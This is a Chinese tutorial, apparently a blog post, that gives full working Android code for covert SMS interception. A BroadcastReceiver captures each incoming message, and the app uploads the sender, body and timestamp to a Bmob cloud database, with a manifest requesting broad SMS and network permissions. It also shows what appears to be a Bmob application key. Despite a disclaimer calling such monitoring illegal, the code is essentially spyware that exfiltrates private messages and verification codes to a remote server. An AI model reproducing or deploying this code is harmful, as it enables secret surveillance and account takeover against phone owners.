# 百战经典第十五-窃听风云之短信监听

最近在做监听验证码短信自动填入的功能，无意间想到了一个短信监听的办法。免责声明：短信监听本身是一种违法行为，这里只是技术描述，请大家学习技术即可。

本实例是基于bmob提供的后台服务，将监听到的短信自动上传到bmob数据库中。

### 一、代码实现：

为了便于操作，首先对要监听的对象进行封装：

```
package com.example.messagecut;   
import cn.bmob.v3.BmobObject;  
public class MsgContent extends BmobObject  {  
    private String form;  
    private String content;  
    private String time;  
    public String getForm() {  
        return form;  
    }  
    public void setForm(String form) {  
        this.form = form;  
    }  
    public String getContent() {  
        return content;  
    }  
    public void setContent(String content) {  
        this.content = content;  
    }  
    public String getTime() {  
        return time;  
    }  
    public void setTime(String time) {  
        this.time = time;  
    }  
}  
```

BroadcastReceiver:

```
package com.example.messagecut;  
//省略import  
/** 
 * 配置广播接收者: <receiver android:name=".SMSBroadcastReceiver"> <intent-filter 
 * android:priority="1000"> <action android:name= 
 * "android.provider.Telephony.SMS_RECEIVED"/> </intent-filter> </receiver>  
 * 注意: <intent-filter android:priority="1000">表示: 设置此广播接收者的级别为最高 
 */    
public class SMSBroadcastReceiver extends BroadcastReceiver {  
    private static MessageListener mMessageListener;  
    public SMSBroadcastReceiver() {  
        super();  
    }  
    @Override  
    public void onReceive(Context context, Intent intent) {  
        Object[] pdus = (Object[]) intent.getExtras().get("pdus");  
        for (Object pdu : pdus) {  
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);  
            String sender = smsMessage.getDisplayOriginatingAddress();  
            String content = smsMessage.getMessageBody();  
            long date = smsMessage.getTimestampMillis();  
            Date timeDate = new Date(date);  
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");  
            String time = simpleDateFormat.format(timeDate);  
            System.out.println("短信来自:" + sender);  
            System.out.println("短信内容:" + content);  
            System.out.println("短信时间:" + time);  
            mMessageListener.OnReceived(sender + "," + content + "," + time);  
        }  
    }  
  
    // 回调接口  
    public interface MessageListener {  
        public void OnReceived(String message);  
    }  
    public void setOnReceivedMessageListener(MessageListener messageListener) {  
        this.mMessageListener = messageListener;  
    }  
}  
```

通过SmsMessage 类的createFromPdu方法获取SmsMessage对象，调用其getDisplayOriginatingAddress方法获取发信人信息，调用其getMessageBody获得短信内容信息，调用其
getTimestampMillis获得发送时间信息，将这三个信息通过逗号隔开拼接成一个字符串，用回调的方法将这个字符串传递到Activity中。
MainActivity.java:

```
package com.example.messagecut;  
//省略import
/** 
 * Demo描述: 利用BroadcastReceiver实现监听短信 
 * 注意权限: <uses-permission android:name="android.permission.RECEIVE_SMS"/> 
 */  
public class MainActivity extends Activity {  
    private SMSBroadcastReceiver mSMSBroadcastReceiver;  
    private String message;  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
  setContentView(R.layout.activity_main);  
        Bmob.initialize(this, "8f3ffb2658d8a3366a70a0b0ca0b71b2");      
        mSMSBroadcastReceiver = new SMSBroadcastReceiver();          mSMSBroadcastReceiver.setOnReceivedMessageListener(new MessageListener() {  
            public void OnReceived(String message) {      
                String[] msg=message.split(",");  
                MsgContent msgContent=new MsgContent();                                       msgContent.setForm(msg[0]);                
                 msgContent.setContent(msg[1]);                 msgContent.setTime(msg[2]);     
                      msgContent.save(MainActivity.this, new SaveListener() {   
                    @Override  
                    public void onSuccess() {//上传成功       
                    }   
                    @Override  
                    public void onFailure(int arg0, String arg1) {       
                    }  
                });       
            }  
        });  
    }  
}  
```

接口回调的方法获取字符串的内容，调用split方法将字符串的内容截取成字符串数组，然后依次获取发送人，发送内容和发送时间的内容，将这些内容结合Bmob的API上传到Bmob后台，实现短信监听的目的。
最后，配置AndroidManifest.xml文件：

```
<?xml version="1.0" encoding="utf-8"?>  
<manifest xmlns:android="http://schemas.android.com/apk/res/android"  
    package="com.example.messagecut"  
    android:versionCode="1"  
    android:versionName="1.0" >  
    <uses-sdk  
        android:minSdkVersion="8"  
        android:targetSdkVersion="21" />  
    <application  
        android:allowBackup="true"  
        android:icon="@drawable/ic_launcher"  
        android:label="@string/app_name"  
        android:theme="@style/AppTheme" >  
        <activity  
            android:name=".MainActivity"  
            android:label="@string/app_name" >  
            <intent-filter>  
                <action android:name="android.intent.action.MAIN" />  
                <category android:name="android.intent.category.LAUNCHER" />  
            </intent-filter>  
        </activity>  
        <receiver android:name=".SMSBroadcastReceiver" >  
            <intent-filter>  
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />  
            </intent-filter>  
        </receiver>  
    </application>  
    <!-- 发送短信 -->  
    <uses-permission android:name="android.permission.SEND_SMS" />  
    <!-- 阅读消息 -->  
    <uses-permission android:name="android.permission.READ_SMS" />  
    <!-- 写入消息 -->  
    <uses-permission android:name="android.permission.WRITE_SMS" />  
    <!-- 接收消息 -->  
    <uses-permission android:name="android.permission.RECEIVE_SMS" />  
    <uses-permission android:name="android.permission.INTERNET" />  
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />  
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />  
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />  
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />  
    <uses-permission android:name="android.permission.READ_LOGS" />   
</manifest>  
```

为了保证项目运行，需要配置一些权限。

运行项目实例，然后用另一个手机发一条短信到测试手机，这时就会在后台数据库中看到这样一条信息，如下截图：

![](images/48.png)

已经实现了短信监听的功能。